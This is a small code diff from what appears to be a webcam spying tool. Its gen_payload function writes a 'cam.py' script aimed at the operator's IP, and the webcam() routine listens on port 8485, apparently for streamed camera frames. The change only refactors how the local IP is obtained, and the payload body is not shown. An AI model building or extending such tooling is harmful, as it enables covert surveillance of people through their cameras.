@@ -3,6 +3,7 @@ import cv2
 import pickle
 import struct 
 from colorama import Fore,deinit,init
+from modules.fonctions import get_self_ip
 
 def gen_payload(ip):
     f=open("cam.py","w")
@@ -18,10 +19,10 @@ def gen_payload(ip):
 def webcam():
     init()
     
-    HOST : str = get_ip()
+    HOST : str = get_self_ip()
     PORT=8485
     
-    gen_payload(HOST,PORT)
+    gen_payload(HOST)
 
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     print(Fore.GREEN)
